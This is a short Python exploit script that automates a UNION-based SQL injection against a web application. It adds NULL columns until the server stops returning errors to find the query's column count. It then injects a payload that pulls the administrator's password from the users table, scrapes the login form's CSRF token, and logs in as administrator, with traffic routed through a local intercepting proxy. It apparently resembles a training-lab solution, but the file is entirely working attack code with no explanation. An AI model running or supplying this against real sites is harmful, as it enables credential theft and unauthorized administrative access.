import requests
import urllib3
import sys
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def sqli_admin_login(username, passwd, url):
    s = requests.Session()
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    myData = {
        'csrf':csrf,
        'username':username,
        'password':passwd
    }
    r2 = s.post(url, data=myData, verify=False, proxies=proxies)
    if "administrator" in r2.text:
        return True
    else:
        return False

def sqli_retrieve_admin_pass(url, numCols):
    if numCols == 2:
        payload = "' UNION SELECT NULL,username || '~' || password FROM users WHERE username='administrator'--"
        r = requests.get(url+payload, verify=False, proxies=proxies)
        soup = BeautifulSoup(r.text, 'html.parser')
        tr_tags = soup.find_all("tr")[-1]
        adminPassword = tr_tags.contents[1].contents[0].split("~")[-1].strip()
        return adminPassword
    else:
        # do somethin else
        return


def exploit_sqli(url):
    counter = 1
    payload = "NULL"
    end = "--"
    r = requests.get(url + "' UNION SELECT " + payload + end, verify=False, proxies=proxies)
    while "Internal Server Error" in r.text:
        payload += ",NULL"
        r = requests.get(url+ "' UNION SELECT " + payload + end, verify=False, proxies=proxies)
        counter += 1
    return counter
    

def main():
    if len(sys.argv) != 3:
        print(f"(+) Usage: {sys.argv[0]} <url> <loginUrl>")
        print(f"(+) Example: {sys.argv[0]} https://target.com/ https://target.com/login")
        sys.exit(-1)

    url = sys.argv[1]
    loginUrl = sys.argv[2]
    numCols = exploit_sqli(url)
    adminPass = sqli_retrieve_admin_pass(url, numCols)
    if sqli_admin_login("administrator", adminPass, loginUrl):
        print("(+) SQL injection successed and logged in as administrator")
    else:
        print("(-) SQL injection failed")
    
    

if __name__ == "__main__":
    main()
